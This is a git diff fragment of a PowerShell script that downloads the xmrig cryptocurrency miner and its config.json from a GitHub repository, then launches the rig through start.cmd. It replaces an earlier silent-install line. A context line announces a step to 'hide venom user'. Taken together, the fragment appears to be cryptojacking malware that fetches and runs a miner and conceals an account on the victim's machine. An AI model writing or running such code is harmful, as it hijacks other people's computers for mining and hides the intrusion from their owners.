@@ -81,11 +81,11 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs
 
 Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/rig/xmrig.exe -OutFile "xmrig.exe"
 
-pause
-#.\attempt1.exe; ./calty2
-    # Install the attempt1.exe file
-#powershell Start-Process -FilePath $path .\attempt1.exe -ArgumentList "/silent" -Wait
-powershell Start-Process -Wait -FilePath '$path/$wd/.\xmrig.exe' -ArgumentList '/s /v/qn' -PassThru
+Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json -OutFile "config.json"
+
+# start rig
+powershell ./start.cmd
+
 
 # hide venom user
 
